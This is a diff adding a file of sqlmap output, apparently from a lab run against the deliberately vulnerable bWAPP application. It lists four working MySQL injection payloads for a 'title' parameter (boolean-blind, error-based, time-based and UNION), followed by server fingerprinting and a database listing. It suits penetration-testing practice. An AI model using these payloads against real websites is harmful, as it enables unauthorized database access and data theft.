@@ -1,0 +1,28 @@
+sqlmap identified the following injection point(s) with a total of 130 HTTP(s) requests:
+---
+Parameter: title (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: title=Iron Man' OR NOT 9562=9562#
+
+    Type: error-based
+    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
+    Payload: title=Iron Man' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171766a71,(SELECT (ELT(8578=8578,1))),0x7162717071,0x78))s), 8446744073709551610, 8446744073709551610)))-- XEsP
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=Iron Man' AND (SELECT 4283 FROM (SELECT(SLEEP(5)))WcSD)-- HHRP
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 7 columns
+    Payload: title=Iron Man' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171766a71,0x79676470567a555664475a6a4d45674e5a55784f6e716f4e69535479617a6d5149574a4a56794743,0x7162717071),NULL#
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.5.9, Apache 2.4.7
+back-end DBMS: MySQL >= 5.5
+available databases [4]:
+[*] bWAPP
+[*] information_schema
+[*] mysql
+[*] performance_schema
+
